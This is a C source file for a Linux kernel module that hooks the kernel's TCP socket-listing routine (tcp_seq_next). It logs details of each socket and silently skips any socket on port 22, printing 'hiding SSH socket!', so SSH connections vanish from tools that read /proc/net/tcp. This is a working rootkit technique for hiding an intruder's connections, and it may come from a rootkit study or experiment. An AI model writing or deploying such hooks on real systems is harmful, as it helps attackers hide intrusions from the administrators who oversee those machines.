#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/seq_file.h>
#include <linux/tcp.h>
#include <linux/kernel.h>
#include <net/tcp.h>

#include <hook.h>
#include <ksyms.h>

void *tcp_seq_next_hook(struct seq_file *seq, void *v, loff_t *pos)
{   
    /* original tcp_seq_next_hook code */

    struct tcp_iter_state *st = seq->private;
    void *rc = NULL;

    if (v == SEQ_START_TOKEN) {
        rc = ksyms__tcp_get_idx(seq, 0);
        goto out;
    }

    switch (st->state) {
    case TCP_SEQ_STATE_LISTENING:
        rc = ksyms__listening_get_next(seq, v);
        if (!rc) {
            st->state = TCP_SEQ_STATE_ESTABLISHED;
            st->bucket = 0;
            st->offset = 0;
            rc	  = ksyms__established_get_first(seq);
        }
        break;
    case TCP_SEQ_STATE_ESTABLISHED:
        rc = ksyms__established_get_next(seq, v);
        break;
    }
out:
    ++*pos;
    st->last_pos = *pos;

    /* hook code */

    if (rc) {
        printk(KERN_INFO "==== SOCKET ====");
        printk(KERN_INFO "sk_prot: %s", ((struct sock *)rc)->sk_prot->name);
        printk(KERN_INFO "sk_daddr: %x", ((struct sock *)rc)->sk_daddr);
        printk(KERN_INFO "sk_rcv_saddr: %x", ((struct sock *)rc)->sk_rcv_saddr);
        printk(KERN_INFO "sk_dport: %d", ((struct sock *)rc)->sk_dport);
        printk(KERN_INFO "sk_num: %d", ((struct sock *)rc)->sk_num);

        if (((struct sock *)rc)->sk_num == 22) {
            printk(KERN_INFO "hiding SSH socket!");
            return seq->op->next(seq, rc, pos);
        }
    }

    /* original tcp_seq_next_hook code */

    return rc;
}

HOOK_DEFINE(hide, tcp_seq_next, &tcp_seq_next, &tcp_seq_next_hook)
